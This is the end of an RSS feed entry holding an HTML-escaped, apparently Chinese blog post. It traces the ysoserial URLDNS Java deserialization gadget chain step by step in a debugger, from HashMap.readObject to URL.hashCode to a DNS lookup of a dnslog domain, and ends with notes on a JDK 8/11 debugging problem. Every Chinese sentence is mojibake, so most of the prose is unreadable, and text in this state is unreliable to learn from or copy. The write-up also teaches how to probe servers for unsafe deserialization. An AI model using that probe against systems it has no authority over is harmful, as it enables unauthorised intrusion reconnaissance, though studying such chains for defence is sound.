&lt;p&gt;åˆ·æ–° dnslog çš„è¯·æ±‚è®°å½•ï¼Œå‘ç°æ¥æ”¶åˆ°äº†è¯·æ±‚ï¼Œåˆ©ç”¨æˆåŠŸ&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;6.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;ä»£ç è°ƒè¯•&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ä»£ç è°ƒè¯•&#34;&gt;#&lt;/a&gt; ä»£ç è°ƒè¯•&lt;/h2&gt;
&lt;p&gt;æˆ‘ä»¬ä» main å‡½æ•°ä¸€æ­¥ä¸€æ­¥è°ƒè¯•ï¼Œä¼šå‘ç° URLDNS åœ¨ main ä¸­è°ƒç”¨ PayloadRunner#run ()&lt;/p&gt;
&lt;p&gt;ç„¶å PayloadRunner#run () ä¸­è°ƒç”¨ URLDNS#getObject ()&lt;/p&gt;
&lt;p&gt;URLDNS#getObject () ä¸­çš„ HashMap &lt;strong&gt;ht&lt;/strong&gt; å°±æ˜¯æˆ‘ä»¬è¦ç”Ÿæˆçš„ï¼ˆæœªåºåˆ—åŒ–ï¼‰payload&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;13.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;getObeject æ–¹æ³•ä¸­ï¼Œåˆ›å»ºäº†ä¸€ä¸ª URL å¯¹è±¡ï¼ˆå­˜å‚¨æˆ‘ä»¬è¾“å…¥çš„ dns åœ°å€ï¼‰â€“&amp;gt; å†å°† URL å¯¹è±¡æ”¾å…¥ HashMap ä¸­&lt;/p&gt;
&lt;p&gt;ä¸‹é¢ä¸€è¡Œçš„æ³¨é‡Šå†™é“ï¼Œåœ¨ä¸Šé¢çš„ put è¿‡ç¨‹ä¸­ï¼Œè®¡ç®—å¹¶ç¼“å­˜äº† URL çš„ hashCode; è¿™å°†é‡ç½®å®ƒï¼Œä»¥ä¾¿ä¸‹æ¬¡è°ƒç”¨ hashCode æ—¶å°†è§¦å‘ DNS æŸ¥æ‰¾&lt;/p&gt;
&lt;p&gt;é‚£ä¹ˆåœ¨ ht.put æ—¶ï¼Œæˆ‘ä»¬è¿›å…¥ HashMap æŸ¥çœ‹ï¼Œå‘ç° key è¿›è¡Œäº† hash è®¡ç®—&lt;/p&gt;
&lt;p&gt;ï¼ˆè¿™é‡Œæ’æ’­ä¸€æ¡å°é“æ¶ˆæ¯ï¼Œç‚¹å‡»è¿™ä¸ªè°ƒè¯•å¯ä»¥è¿”å›ä¸Šä¸€æ­¥&lt;img src=&#34;14.png&#34; style=&#34;zoom:90%;&#34; /&gt;)&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;15.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;åœ¨è¿™é‡Œå°±æ˜¯æˆ‘ä»¬çš„ URL å¯¹è±¡è¿›è¡Œäº† hash è®¡ç®—&lt;/p&gt;
&lt;p&gt;hash è®¡ç®—å‰çš„ URL å¯¹è±¡ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;16.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;hash è®¡ç®—åçš„å¯¹è±¡ï¼ˆå°±æ˜¯å¯¹è±¡ä¸­çš„ hashCode å˜é‡å‘ç”Ÿäº†å˜åŒ–å˜›ï¼‰ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;19.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;è¿›å…¥ä¸‹ä¸€è¡Œä»£ç ï¼ŒReflections.setFieldValue æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿ&lt;/p&gt;
&lt;p&gt;çœ‹åå­—å°±æ˜¯ä¸€ä¸ªé€šè¿‡åå°„è®¾ç½®æˆå‘˜å˜é‡å€¼çš„åŠŸèƒ½ğŸ˜€&lt;/p&gt;
&lt;p&gt;è¿›å…¥å‡½æ•°å†…éƒ¨ï¼Œæ˜¯è¦è®¾ç½®ä¼ å…¥å¯¹è±¡çš„æˆå‘˜å˜é‡ hashCode çš„å€¼&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;17.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;æŸ¥çœ‹å˜é‡å€¼ï¼Œä¼ å…¥å¯¹è±¡æ˜¯åŒ…å« payload çš„ URL å¯¹è±¡ï¼Œè¦å°†å®ƒçš„ hashCode å€¼è®¾ç½®ä¸º - 1&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;18.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;æ‰§è¡Œå®Œè¿™è¡Œä»£ç ï¼Œå‘ç°å˜é‡ u å’Œ ht ä¸­å­˜å‚¨çš„ URL å¯¹è±¡çš„ hashCode å€¼éƒ½å˜ä¸º - 1 äº†&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;20.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;ç„¶åè¿”å› htï¼Œä¹Ÿå°±æ˜¯æ›´æ”¹è¿‡å­˜å‚¨ key çš„ hashCode å€¼çš„ HashMap&lt;/p&gt;
&lt;p&gt;å†æ¬¡è¿›å…¥ PalodRunner#runï¼Œè¿”å›çš„ HashMap èµ‹å€¼ç»™ objBeforeï¼Œå†å°†å…¶åºåˆ—åŒ–èµ‹å€¼ç»™ ser&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;21.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;Utils.releasePayload (payload, objBefore) åº”è¯¥æ˜¯é‡Šæ”¾èµ„æºçš„ä»£ç ï¼ˆä¸ç”¨åœ¨æ„ï¼Œå’Œæœ€åè¿”å›å€¼æ— å…³ï¼‰&lt;/p&gt;
&lt;p&gt;æœ€åè¿”å› serï¼Œå³å°† ser å€¼èµ‹ç»™å˜é‡ serializedï¼Œæ‰€ä»¥ serialized å°±æ˜¯åºåˆ—åŒ–åçš„ payload&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;ç»ˆäºï¼å¼€å§‹ååºåˆ—åŒ–è§¦å‘æ¼æ´äº†ï¼&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;ä»è¿™é‡Œè¿›å…¥ååºåˆ—åŒ–å‡½æ•°&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;22.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;ä»£ç æ³¨é‡Šä¸­è¯´æ˜ï¼Œ&lt;strong&gt;åˆ©ç”¨é“¾ä» HashMap#readObject () è¿›å…¥ï¼Œç›´åˆ°è¿›å…¥ URL#hashCode () è§¦å‘ DNS è¯·æ±‚&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Gadget Chain:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;pre&gt;&lt;code&gt;HashMap.readObject()
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;pre&gt;&lt;code&gt;HashMap.putVal()
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;pre&gt;&lt;code&gt;HashMap.hash()
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;pre&gt;&lt;code&gt;URL.hashCode()
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;
&lt;p&gt;é‚£æˆ‘ä»¬å°±ä¸€ç›´ç‚¹ç‚¹ç‚¹ç›´æ¥çœ‹è§ readObject&lt;/p&gt;
&lt;p&gt;å¥½äº†è¿‡äº†æ²¡çœ‹è§å˜¤å˜¤å˜¤&lt;/p&gt;
&lt;p&gt;ç›´æ¥å» Hash#readObject å¤„ä¸‹ä¸ªæ–­ç‚¹&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;23.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;å¾€ä¸‹ç¿»ç¿»å°±ä¼šçœ‹è§ä¸€æ®µä»£ç ï¼Œåˆçœ‹è§äº†ç†Ÿæ‚‰çš„å•è¯ï¼Œhash&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;24.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;æ ¹æ®åˆ©ç”¨é“¾æˆ‘ä»¬å¯çŸ¥è§¦å‘æ¼æ´çš„ hashCode () å°±åœ¨ hash () ä¸­ï¼Œæˆ‘ä»¬è¿›å…¥è¯¥å‡½æ•°&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;25.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;åˆ°è¾¾ URL#hashCodeï¼Œæœç„¶å…¶ä¸­æœ‰ key.hashCode ()&lt;/p&gt;
&lt;p&gt;å› ä¸ºæˆ‘ä»¬åœ¨æ„é€  payload æ—¶å°† hashCode èµ‹å€¼ä¸º - 1ï¼Œæ‰€ä»¥ä¸ä¼šè¿›å…¥ if è€Œæ˜¯æ‰§è¡Œä¸‹é¢çš„ä»£ç &lt;/p&gt;
&lt;p&gt;è°ƒç”¨ URLStreamHandler#hashCode&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;26.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;è¿›å…¥ URLStreamHandler#hashCode&lt;/p&gt;
&lt;p&gt;æ ¹æ® p ç¥çš„æ–‡ç« æ‰€è¨€ï¼ŒgetHostAddress ä¸­æœ‰ä¸€è¡Œä»£ç &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;InetAddress.getByName(host) ;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;å…¶ä½œâ½¤æ˜¯æ ¹æ®ä¸»æœºåï¼Œè·å–å…¶ IP åœ°å€ï¼Œåœ¨â½¹ç»œä¸Šå…¶å®å°±æ˜¯â¼€æ¬¡ DNS æŸ¥è¯¢ï¼Œæ•´ä¸ªè§¦å‘è¿‡ç¨‹å°±å·²ç»å®Œæˆå•¦&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;27.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;28.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;åé¢ç»§ç»­è·Ÿè¿›å°±æ˜¯åœ°å€çš„å…·ä½“æŸ¥è¯¢è¿‡ç¨‹äº†ï¼Œæ— äº†æ— äº†&lt;/p&gt;
&lt;p&gt;ä¸‹å›¾æ˜¯æ¼æ´è§¦å‘çš„è°ƒç”¨æ ˆ&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;29.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;æ€»ç»“&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#æ€»ç»“&#34;&gt;#&lt;/a&gt; æ€»ç»“&lt;/h1&gt;
&lt;p&gt;&lt;strong&gt;payload æ„é€ &lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;å°†æˆ‘ä»¬è¾“å…¥çš„ dns åœ°å€å­˜å‚¨åœ¨ URL å¯¹è±¡ä¸­ -&amp;gt; å°† URL å¯¹è±¡ä½œä¸º key å­˜å‚¨åœ¨ HashMap ä¸­ -&amp;gt; ç”±äºä½œä¸º key å€¼ï¼Œåœ¨ put æ—¶ä¼šè¿›è¡Œ hash è®¡ç®—ï¼Œé‚£æˆ‘ä»¬å°±é€šè¿‡åå°„æ›´æ”¹å…¶ hashCode å€¼ä¸º - 1&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;æ¼æ´è§¦å‘&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;ååºåˆ—åŒ– HashMap æ—¶ï¼Œä¼šè°ƒç”¨ hash () è®¡ç®— key çš„ hash å€¼ -&amp;gt; è®¡ç®—æ—¶ï¼Œè°ƒç”¨ (URL å¯¹è±¡) key#hashCode () -&amp;gt; ç”±äºæˆ‘ä»¬å°†è¯¥å¯¹è±¡çš„ hashCode å€¼è®¾ç½®ä¸º - 1ï¼Œæ‰€ä»¥ä¼šè°ƒç”¨ handler.hashCode () -&amp;gt; å…¶ä¸­è·å–åœ°å€çš„ä»£ç ï¼Œ &lt;code&gt; InetAddress addr = getHostAddress(u);&lt;/code&gt;  å®é™…ä¸Šå°±æ˜¯ä¸€æ¬¡ DNS æŸ¥è¯¢&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;å°å½©è›‹&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;åœ¨æ„é€  payloadï¼Œht.put () æ—¶ï¼Œç”±äº URL çš„ hashCode å€¼ä¸º - 1ï¼Œæ‰€ä»¥åŒæ ·ä¼šè°ƒç”¨ handler.hashCode () è§¦å‘ DNS æŸ¥è¯¢ï¼Œå¯æ˜¯ä¸ºä»€ä¹ˆæˆ‘ä»¬åªèƒ½è·å–åˆ°ä¸€æ¡ dns æŸ¥è¯¢è®°å½•ï¼Œè€Œä¸æ˜¯ä¸¤æ¡å‘¢ï¼Ÿ&lt;/p&gt;
&lt;p&gt;ç›´æ¥åœ¨ DNS æŸ¥è¯¢å¤„ä¸‹æ–­ç‚¹&lt;/p&gt;
&lt;p&gt;ç”Ÿæˆ payload æ—¶ï¼Œè¿›å…¥ URLStreamHandler#hashCode æŸ¥çœ‹å½“å‰å˜é‡&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;31.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;ååºåˆ—åŒ–æ—¶ï¼Œè¿›å…¥ URLStreamHandler#hashCode æŸ¥çœ‹å½“å‰å˜é‡&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;32.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;å¯ä»¥å‘ç°è·å–åˆ°çš„ addr æœ‰å€¼äº†ï¼Œä¸º &lt;code&gt;åŸŸå/127.0.0.1&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;é‚£ä¹ˆåŒæ ·æ˜¯å°† &lt;code&gt;http://ysmzza.dnslog.cn&lt;/code&gt;  ä¼ å…¥ &lt;code&gt;getHostAddress(u)&lt;/code&gt;  å¾—åˆ°çš„ç»“æœå´ä¸ä¸€æ ·å‘¢ï¼Ÿ&lt;/p&gt;
&lt;p&gt;é‚£ä¹ˆæˆ‘ä»¬å†è¿›å…¥ &lt;code&gt;getHostAddress(u)&lt;/code&gt;  è¿›è¡Œå¯¹æ¯”&lt;/p&gt;
&lt;p&gt;æ„é€  payload è¿›å…¥ &lt;code&gt;getHostAddress(u)&lt;/code&gt;  æ—¶ï¼Œå¦‚ä¸‹å›¾&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;33.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;34.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;è¿™é‡Œè°ƒç”¨çš„ SilentURLStreamHandler#getHostAddress ç›´æ¥è¿”å›çš„ null&lt;/p&gt;
&lt;p&gt;æ³¨é‡Š:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;è¿™ä¸ª URLStreamHandler å®ä¾‹ç”¨äºåœ¨åˆ›å»º URL å®ä¾‹æ—¶é¿å…ä»»ä½• DNS è§£æã€‚ DNS è§£æç”¨äºæ¼æ´æ£€æµ‹ã€‚é‡è¦çš„æ˜¯ä¸è¦åœ¨ä½¿ç”¨åºåˆ—åŒ–å¯¹è±¡ä¹‹å‰æ¢æµ‹ç»™å®šçš„ URLã€‚æ½œåœ¨çš„è¯¯æŠ¥ï¼šå¦‚æœé¦–å…ˆä»æµ‹è¯•è®¡ç®—æœºè§£æ DNS åç§°ï¼Œåˆ™ç›®æ ‡æœåŠ¡å™¨å¯èƒ½ä¼šè·å¾—ç¼“å­˜å‡»ä¸­ç¬¬äºŒä¸ªå†³è®®ã€‚&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;è€Œåœ¨æˆ‘ä»¬ååºåˆ—åŒ–åè¿›å…¥ &lt;code&gt;getHostAddress(u)&lt;/code&gt; ï¼ŒURL å¯¹è±¡ä¸­çš„ handler å°±æ˜¯é»˜è®¤çš„ handler äº†ï¼Œå› è€Œä¼šè§¦å‘ DNS æŸ¥è¯¢&lt;/p&gt;
&lt;p&gt;æ‰€ä»¥ POC ä¸­å®šä¹‰ URLStreamHandler å†…éƒ¨ç±»ï¼Œé¿å…ç”Ÿæˆ paayload æ—¶è¿›è¡Œ DNS è§£æï¼ˆå…¶å®çœ‹æ³¨é‡Šå°±èƒ½çœ‹åˆ°ï¼Œä½†æˆ‘ä¸€å¼€æ²¡æœ‰çœ‹åˆ°è¿™é‡Œçš„ä»£ç  (à¹‘ãƒ»ÌÏ‰à¸Ì€à¹‘)  ï¼‰&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;å°é—®é¢˜&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;æ¼æ´æ˜¯é€šè¿‡ URLStreamHandler#hashCode è§¦å‘çš„ï¼Œé‚£ä¹ˆè¿™ä¸ª handler æ˜¯å•¥ç©æ„ï¼Ÿ&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;new URL å¯¹è±¡æ—¶ï¼Œä¸€å®šè¦ä¼ å…¥ handler æ‰èƒ½è§¦å‘æ¼æ´å—ï¼Ÿå¦‚æœä¸ä¼ å…¥ handlerï¼Œç¨‹åºè¿˜èƒ½æ­£å¸¸è¿è¡Œå—ï¼Ÿï¼ˆå› ä¸º HashMap#put æ—¶ä¼šè°ƒç”¨ URLStreamHandler#hashCodeï¼‰ä¼šæœ‰é»˜è®¤çš„ handler ç»™æˆ‘ä»¬è°ƒç”¨å—ï¼Ÿ&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;æŸ¥æŸ¥ API&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;æŠ½è±¡ç±» &lt;code&gt; URLStreamHandler&lt;/code&gt;  æ˜¯æ‰€æœ‰æµåè®®å¤„ç†ç¨‹åºçš„é€šç”¨ç±»ï¼Œæµåè®®å¤„ç†ç¨‹åºçŸ¥é“å¦‚ä½•ä¸ºç‰¹å®šåè®®ç±»å‹å»ºç«‹è¿æ¥ï¼Œå¦‚ &lt;code&gt;http&lt;/code&gt;  æˆ– &lt;code&gt;https&lt;/code&gt; ã€‚&lt;/p&gt;
&lt;p&gt;åœ¨å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œ  &lt;code&gt;URLStreamHandler&lt;/code&gt;  å­ç±»çš„å®ä¾‹ä¸æ˜¯ç”±åº”ç”¨ç¨‹åºç›´æ¥åˆ›å»ºçš„ã€‚  æ›´ç¡®åˆ‡åœ°è¯´ï¼Œåœ¨ç¬¬ä¸€æ—¶é—´æ„å»ºæ—¶çš„åè®®åç§°é‡åˆ° &lt;code&gt;URL&lt;/code&gt;  ï¼Œé€‚å½“çš„æµåè®®å¤„ç†ç¨‹åºè¢«è‡ªåŠ¨åŠ è½½ã€‚&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;æ‰€ä»¥æµåè®®ç¨‹åºç”¨äºä¸ºåè®®å»ºç«‹è¿æ¥ï¼Œå¹¶æ„å»ºæ—¶çš„åè®®åç§°é‡è§ URL æ—¶ï¼Œé€‚å½“çš„æµåè®®å¤„ç†ç¨‹åºè¢«è‡ªåŠ¨åŠ è½½&lt;/p&gt;
&lt;p&gt;æ‰€ä»¥å…¶å®ä¸ä¼ å…¥ handlerï¼ŒURL å¯¹è±¡ä¹Ÿä¼šè‡ªåŠ¨åŠ è½½ handler&lt;/p&gt;
&lt;p&gt;ç”±å°å½©è›‹çš„å†…å®¹å¯çŸ¥ä¼ å…¥è‡ªå®šä¹‰çš„ handler åªæ˜¯ä¸ºäº†åœ¨ç”Ÿæˆ payload æ—¶ä¸è¿›è¡Œ dns è§£æ&lt;/p&gt;
&lt;h2 id=&#34;è°ƒè¯•é‡åˆ°çš„é—®é¢˜æœªè§£å†³&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#è°ƒè¯•é‡åˆ°çš„é—®é¢˜æœªè§£å†³&#34;&gt;#&lt;/a&gt; è°ƒè¯•é‡åˆ°çš„é—®é¢˜ï¼ˆæœªè§£å†³ï¼‰&lt;/h2&gt;
&lt;p&gt;åœ¨å°è¯•ä»£ç è°ƒè¯•æ—¶ï¼Œå‘ç°æ— æ³•å¯ç”¨ debug&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;7.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;çœ‹ç¬¬ä¸€è¡Œï¼Œè¿è¡Œçš„æ˜¯ jdk8_32ï¼Œè€Œæˆ‘çš„ idea æ˜¯ 64 ä½çš„ï¼Œä¼°è®¡æ˜¯ä¸ä¸€è‡´å¯¼è‡´çš„é—®é¢˜ï¼ˆä»¥å‰ç»å¸¸ç¢°è§ tomcat å’Œ jdk ä¸ä¸€è‡´å¯¼è‡´çš„é—®é¢˜ï¼‰&lt;/p&gt;
&lt;p&gt;åœ¨ä¸Šæ–¹èœå•æ  file-&amp;gt;project structure ä¸­å¯ä»¥è®¾ç½® jdk ç‰ˆæœ¬ï¼Œæ›´æ”¹ä¸º 64 ä½ jdk&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;8.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;ç„¶åå°±ä¼šæŠ¥é”™ï¼Œç¨‹åºåŒ… sun.rmi.server ä¸å­˜åœ¨&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;9.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;ä½†æ˜¯åœ¨ä½¿ç”¨ jdk8 è¿è¡Œç¨‹åºæ—¶å¹¶æ²¡æœ‰è¯¥é”™è¯¯ï¼Œctrl+click ç‚¹å‡»è¿›å…¥æŠ¥é”™ç¨‹åºåŒ…ï¼Œæ˜¯å¯ä»¥æ‰¾åˆ°åœ¨ java åŸç”Ÿåº“ä¸­çš„&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;10.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;ä¹Ÿå°±æ˜¯è¯´åœ¨ç¼–è¯‘ç¨‹åºçš„ classpath ä¸­æ²¡æœ‰åŒ…å«â€™sun.rmi.serverâ€™è¿™ä¸ªåŒ…&lt;/p&gt;
&lt;p&gt;æˆ‘çš„ç›´è§‰å‘Šè¯‰æˆ‘æ˜¯ç‰ˆæœ¬çš„é—®é¢˜ï¼Œå¯æ˜¯ä¸Šå›¾ä¸­ jdk11 çš„åŒ…é‡Œé¢ä¹Ÿæœ‰è¿™ä¸ªåŒ…çš„å¹¶ä¸”å·²ç»å¼•å…¥é¡¹ç›®ä¸­äº†&lt;/p&gt;
&lt;p&gt;æ‰€ä»¥æˆ‘æ¢å› jdk8_32ï¼ŒæŸ¥çœ‹ jar åŒ…çš„åŒºåˆ«&lt;/p&gt;
&lt;p&gt;jdk8ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;11.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;jdk11:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;12.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;éš¾é“è¿™ä¸ªä¸–ç•Œæœ‰äº›ä¸œè¥¿æˆ‘çœŸçš„ï¼Œéš¾ä»¥æ¢å¯»å—ï¼Œè¿™çœŸçš„å°±æ˜¯æˆ‘çš„æé™äº†å—ï¼Œä¸ï¼Œæˆ‘è¦å»ç™¾åº¦ï¼ï¼ç™¾åº¦æ•‘æˆ‘ï¼ï¼ï¼&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;a href=&#34;https://xy2401.com/local-docs/oracle/java.zh/11/migrate/#JSMIG-GUID-D7936F0D-08A9-411E-AD2F-E14A38DA56A7&#34;&gt;è¿™é‡Œå‘ç°&lt;/a&gt;ï¼Œjdk11 ä¸å†æä¾› corba å·¥å…·ï¼Œrmic (RMI ç¼–è¾‘å™¨) ä¸å†æ”¯æŒ - idl æˆ– - iiop é€‰é¡¹ã€‚&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;å¯æ˜¯ java11 çš„ api é‡Œé¢æ˜¯æœ‰ rmi çš„ğŸ™&lt;/p&gt;
&lt;p&gt;æœç„¶æ¢æˆ jdk8_64 æ‰€æœ‰é—®é¢˜è¿åˆƒè€Œè§£ï¼Œé‚£ä¹ˆè¿™ä¸ªé—®é¢˜â€¦&lt;/p&gt;
&lt;p&gt;å½“ç„¶ä¸èƒ½ç®—è§£å†³äº†ï¼Œæœªå®Œå¾…ç»­ï¼&lt;/p&gt;
 ]]></description>
        </item>
    </channel>
</rss>
